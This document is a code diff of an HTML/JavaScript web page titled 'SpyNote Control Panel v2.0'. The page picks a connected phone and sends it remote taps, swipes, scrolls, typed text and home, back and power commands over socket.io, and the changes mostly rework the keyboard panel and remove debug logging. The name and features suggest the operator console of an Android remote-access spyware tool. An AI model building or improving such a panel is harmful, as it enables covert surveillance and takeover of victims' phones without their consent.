@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote Control Panel</title>
+    <title>📱 SpyNote Control Panel v2.0</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="/socket.io/socket.io.js"></script>
     <style>
@@ -41,19 +41,15 @@
         #bottom-controls { bottom: 20px; left: 50%; transform: translateX(-50%); }
         
         #keyboard-panel {
-            position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%);
+            position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
             background: rgba(0,0,0,0.95); padding: 15px; border-radius: 15px;
             backdrop-filter: blur(20px); border: 1px solid #333; display: none;
-            max-width: 400px; width: 90vw;
+            z-index: 1002; max-width: 400px; width: 90%;
         }
-        #keyboard-input {
-            width: 100%; padding: 12px; background: #1e1e2e; color: white;
-            border: 1px solid #333; border-radius: 8px; font-size: 16px;
-        }
-        #keyboard-send { 
-            width: 100%; margin-top: 10px; background: linear-gradient(45deg, #00ff88, #00cc6a);
-            color: #000; font-weight: 600;
-        }
+        #keyboard-input { width: 100%; padding: 12px; background: #1e1e2e; 
+            color: white; border: 1px solid #333; border-radius: 8px; font-size: 16px; }
+        .kb-btn { padding: 8px 16px; margin: 3px; background: #667eea; 
+            color: white; border: none; border-radius: 20px; cursor: pointer; }
         
         button {
             padding: 12px 24px; margin: 5px; background: linear-gradient(45deg, #667eea, #764ba2); 
@@ -68,6 +64,7 @@
             #devices { left: 0; top: 0; width: 100%; max-height: 200px; }
             #phone-frame { right: 0; top: 220px; transform: none; width: 100vw; height: 70vh; border-width: 15px; }
             #top-controls { right: 10px; }
+            #keyboard-panel { bottom: 80px; left: 10px; right: 10px; transform: none; width: calc(100% - 20px); }
         }
     </style>
 </head>
@@ -82,7 +79,6 @@
     <div id="top-controls">
         <button onclick="sendHome()">🏠 Home</button>
         <button onclick="sendRecent()">📋 Recent</button>
-        <button onclick="toggleKeyboard()">⌨️ Type</button>
     </div>
 
     <div id="phone-frame">
@@ -91,14 +87,17 @@
 
     <div id="bottom-controls">
         <button onclick="sendBack()">🔙 Back</button>
-        <button onclick="toggleFullScreen()">📱 Full</button>
+        <button onclick="toggleKeyboard()">⌨️ Type</button>
         <button onclick="sendPower()">🔒 Power</button>
     </div>
 
-    <!-- 🔥 NEW TYPING PANEL -->
+    <!-- 🔥 NEW KEYBOARD PANEL -->
     <div id="keyboard-panel">
-        <input type="text" id="keyboard-input" placeholder="Type here and press Enter/Send..." maxlength="500">
-        <button id="keyboard-send" onclick="sendText()">📤 Send Text</button>
+        <div style="margin-bottom: 10px;">
+            <input type="text" id="keyboard-input" placeholder="Type here and press Enter/Send..." maxlength="500">
+        </div>
+        <button class="kb-btn" onclick="sendText()">📤 Send Text</button>
+        <button class="kb-btn" onclick="toggleKeyboard()">❌ Close</button>
     </div>
 
     <script>
@@ -206,7 +205,6 @@
             startX = coords.x;
             startY = coords.y;
             
-            console.log('👆 TAP START:', coords.x, coords.y);
             sendControl('tap', coords.x, coords.y);
         }
 
@@ -222,14 +220,10 @@
             const dy = Math.abs(coords.y - startY);
             
             if (dy > dx * 1.5 && dy > 30) {
-                if (!scrollMode) {
-                    scrollMode = true;
-                    sendControl('scroll', startX, startY, coords.x, coords.y);
-                    console.log('📜 SCROLL:', startX, startY, '->', coords.x, coords.y);
-                }
+                scrollMode = true;
+                sendControl('scroll', startX, startY, coords.x, coords.y);
             } else if (dx > 20 || dy > 20) {
                 sendControl('swipe', startX, startY, coords.x, coords.y);
-                console.log('🖱️ SWIPE:', startX, startY, '->', coords.x, coords.y);
             }
         }
 
@@ -239,33 +233,24 @@
         }
 
         function sendControl(action, x, y, endX = null, endY = null) {
-            if (!currentDevice) {
-                console.log('❌ No device selected');
-                return;
-            }
+            if (!currentDevice) return;
             
-            const controlData = {
-                deviceId: currentDevice,
-                action: action
-            };
-            
+            const controlData = { deviceId: currentDevice, action };
             if (x !== undefined && y !== undefined) {
                 controlData.x = parseFloat(x);
                 controlData.y = parseFloat(y);
                 controlData.startX = parseFloat(x);
                 controlData.startY = parseFloat(y);
             }
-            
             if (endX !== undefined && endY !== undefined) {
                 controlData.endX = parseFloat(endX);
                 controlData.endY = parseFloat(endY);
             }
             
-            console.log('🎮 CONTROL:', JSON.stringify(controlData));
             socket.emit('control', controlData);
         }
 
-        // 🔥 NEW TYPING FUNCTIONS
+        // 🔥 KEYBOARD FUNCTIONS
         function toggleKeyboard() {
             keyboardPanel.style.display = keyboardPanel.style.display === 'none' ? 'block' : 'none';
             if (keyboardPanel.style.display === 'block') keyboardInput.focus();
@@ -280,8 +265,8 @@
                 action: 'type',
                 text: text
             });
-            console.log('⌨️ TYPING:', text);
             keyboardInput.value = '';
+            console.log('⌨️ Text sent:', text);
         }
 
         keyboardInput.addEventListener('keypress', (e) => {
